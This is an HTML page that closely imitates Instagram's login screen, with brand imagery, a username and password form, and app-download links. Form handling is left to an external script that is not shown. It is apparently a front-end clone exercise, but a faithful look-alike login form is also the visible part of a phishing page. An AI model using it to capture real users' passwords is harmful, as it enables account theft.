
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>

    <!-- Font Awesome (for the Facebook icon) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />

        <link rel="icon" type="image/png" href="instalog.png"/>
    
    <!-- Your own stylesheet (no integrity attribute — that was for Font Awesome, not this file) -->
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">

        <div class="imagesAndTransistion">

           <div id="frame1">
            <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/mobile-frame4.png" alt="" srcset="">

           </div> 
           <div id="frame2">
            <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/mobile-frame3.png" alt="" srcset="">
            <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot4.png" alt="" srcset="">

           </div> 
            

            <div class="transistionImages">
                <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot5.png" alt="" class="fadingImages"> 
                <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot3.png" alt="" class="fadingImages"> 
                <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot2.png" alt="" class="fadingImages"> 
                <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/screenshot1.png" alt="" class="fadingImages">



            </div>

        </div>

        <div class="instagramAll">

        

        <div class="instagramForm">

            <div class="insta-font">
                <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/instagram-font.png" alt="">
            </div>

 <form id="myForm">



  <input type="text" id="field1" placeholder="Phone number, username, or email" required />
  <input type="password" id="field2" placeholder="Password" required />
  <button type="submit" id="lockInBtn">Login</button>



</form>


        </div>

            <div class="no-account">

                <p id="noAccount">Don't have an account? <span><a href="">Sign up</a></span></p>


            </div>


            <div class="get-app">
                <p id="getTheApp">Get the app.</p>

            </div>

            <div class="downloadLinks">

                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN" class="btn googlePlay">
                    <img  src="https://raw.githubusercontent.com/mahesh00009/instagram/main/microsoft%20logo.png" alt="">
                    <p id="getoOnGooglePlay"><span>GET IT ON </span><b>Google Play</b></p>

                </a>


                <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-GB&gl=IN" class="btn microsoft">
                    <img src="https://raw.githubusercontent.com/mahesh00009/instagram/main/googlePlay%20logo.png" alt="">
                    <p id="getoOnGooglePlay"><span>GET IT FROM </span><b> Microsoft</b></p>

                </a>

            </div>
        </div>

    </div>

    <script src="script.js"></script>
